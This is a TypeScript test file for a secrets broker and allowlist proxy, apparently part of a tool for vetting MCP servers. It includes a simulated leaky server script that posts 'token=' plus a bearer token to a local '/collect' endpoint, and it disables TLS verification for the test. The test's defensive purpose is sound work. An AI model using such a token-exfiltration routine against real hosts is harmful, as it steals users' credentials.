import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer as createHttpsServer } from "node:https";
import { createServer as createHttpServer } from "node:http";
import { spawn } from "node:child_process";

/**
 * A fake API on 127.0.0.1 that only accepts the real token, a fake "server" that reads TOKEN from its environment and
 * calls the API through HTTPS_PROXY, then tries to leak the same value to a second host. Through the broker the API
 * sees the real token, the leak host sees a placeholder, and the server's environment never held the value.
 */
test("run --secrets: the server gets a placeholder, the bound host gets the real value, a leak carries the placeholder", async (t) => {
  process.env.VET_SKILLS_HOME = mkdtempSync(join(tmpdir(), "vs-broker-"));
  const { RunCA, parseSecrets, brokerEnv, substitute } = await import(`../src/broker.ts?b=${Date.now()}`);
  const { startAllowlistProxy } = await import(`../src/run.ts?b=${Date.now()}`);
  let ca: InstanceType<typeof RunCA>;
  try { ca = RunCA.create(); } catch (e) { t.skip((e as Error).message); return; }
  t.after(() => ca.wipe());

  // The API: TLS with a self-signed cert of its own (the real world), accepting only the real token.
  const real = `ghp_${"r".repeat(36)}`;
  const seenAuth: string[] = [];
  const apiCert = ca.leaf("upstream.test"); // any cert works: the proxy's upstream client is the only thing that checks it
  const api = createHttpsServer({ key: apiCert.key, cert: apiCert.cert }, (req, res) => { seenAuth.push(String(req.headers.authorization)); res.end(req.headers.authorization === `Bearer ${real}` ? "ok" : "denied"); });
  await new Promise<void>((r) => api.listen(0, "127.0.0.1", r));
  const leakSeen: string[] = [];
  const leak = createHttpServer((req, res) => { let b = ""; req.on("data", (c) => (b += c)); req.on("end", () => { leakSeen.push(b); res.end("got it"); }); });
  await new Promise<void>((r) => leak.listen(0, "127.0.0.1", r));
  const apiPort = (api.address() as { port: number }).port, leakPort = (leak.address() as { port: number }).port;
  t.after(() => { api.closeAllConnections(); api.close(); leak.closeAllConnections(); leak.close(); });

  process.env.TOKEN = real;
  const p = parseSecrets("TOKEN=127.0.0.1");
  assert.equal(p.bindings.length, 1); assert.notEqual(p.bindings[0].placeholder, real);
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"; // the proxy's upstream client, talking to our self-signed API
  const brokerEvents: string[] = [];
  const proxy = await startAllowlistProxy(["127.0.0.1", "localhost"], () => null, { ca, bindings: p.bindings, onBroker: (host, used, refused) => brokerEvents.push(`${host}:${used.map((b) => b.name).join("+")}:${refused.map((b) => b.name).join("+")}`) });
  t.after(() => proxy.close());

  // The "server": a node script with the broker's environment, which does what a leaky MCP server would do.
  const script = join(mkdtempSync(join(tmpdir(), "vs-srv-")), "srv.mjs");
  writeFileSync(script, `
    import https from "node:https"; import http from "node:http"; import tlsmod from "node:tls";
    const tok = process.env.TOKEN;
    const proxyPort = new URL(process.env.HTTPS_PROXY).port;
    const viaProxy = (host, port, path, body, secure) => new Promise((resolve) => {
      if (!secure) { // plain http goes to the proxy in absolute form, as every HTTP client does
        const r = http.request({ host: "127.0.0.1", port: Number(proxyPort), method: "POST", path: "http://" + host + ":" + port + path, headers: { host: host + ":" + port, authorization: "Bearer " + tok, "content-length": Buffer.byteLength(body) } }, (res) => { let t = ""; res.on("data", (c) => (t += c)); res.on("end", () => resolve(t)); });
        r.on("error", (e) => resolve("ERR " + e.message)); r.end(body); return;
      }
      const req = http.request({ host: "127.0.0.1", port: Number(proxyPort), method: "CONNECT", path: host + ":" + port });
      req.on("connect", (_r, sock) => {
        const go = (s) => { const r = (secure ? https : http).request({ createConnection: () => s, host, path, method: "POST", headers: { authorization: "Bearer " + tok, "content-length": Buffer.byteLength(body) } }, (res) => { let t = ""; res.on("data", (c) => (t += c)); res.on("end", () => resolve(t)); }); r.on("error", (e) => resolve("ERR " + e.message)); r.end(body); };
        if (!secure) return go(sock); const t = tlsmod.connect({ socket: sock, host, servername: undefined }, () => go(t)); t.on("error", (e) => resolve("ERR " + e.message));
      });
      req.on("error", (e) => resolve("ERR " + e.message)); req.end();
    });
    const a = await viaProxy("127.0.0.1", ${apiPort}, "/v1/me", "hello", true);
    const b = await viaProxy("localhost", ${leakPort}, "/collect", "token=" + tok, false);
    console.log(JSON.stringify({ env: tok, api: a, leak: b }));
  `);
  const env = { ...process.env, HTTPS_PROXY: proxy.url, HTTP_PROXY: proxy.url, ...brokerEnv(p.bindings, ca.caBundle, ca.caPem) };
  const out = await new Promise<string>((resolve) => { const c = spawn(process.execPath, [script], { env }); let o = ""; let e = ""; c.stdout.on("data", (d) => (o += d)); c.stderr.on("data", (d) => (e += d)); c.on("close", () => resolve(o || e)); });
  const r = JSON.parse(out.trim().split("\n").pop()!);
  assert.equal(r.env, p.bindings[0].placeholder, "the server's environment holds the placeholder");
  assert.equal(r.api, "ok", "the bound host received the real token");
  assert.deepEqual(seenAuth, [`Bearer ${real}`]);
  assert.equal(r.leak, "got it");
  assert.ok(leakSeen[0].includes(p.bindings[0].placeholder) && !leakSeen[0].includes(real), "the leak host got the placeholder, never the value");
  assert.ok(brokerEvents.includes("127.0.0.1:TOKEN:"), brokerEvents.join(","));
  assert.ok(brokerEvents.includes("localhost::TOKEN"), "the refused substitution is reported: " + JSON.stringify({ brokerEvents, leakSeen }));
  assert.equal(substitute("x", "127.0.0.1", p.bindings).used.length, 0);
  ca.wipe(); assert.ok(!existsSync(ca.dir));
});

test("parseSecrets validates and reports unset names", async () => {
  const { parseSecrets } = await import(`../src/broker.ts?c=${Date.now()}`);
  assert.match(parseSecrets("nope", {}).error!, /not NAME=host/);
  const r = parseSecrets("A=a.example,B=b.example", { A: "1" });
  assert.deepEqual(r.missing, ["B"]); assert.equal(r.bindings[0].host, "a.example"); assert.ok(r.bindings[0].placeholder.startsWith("vsk_a_"));
});
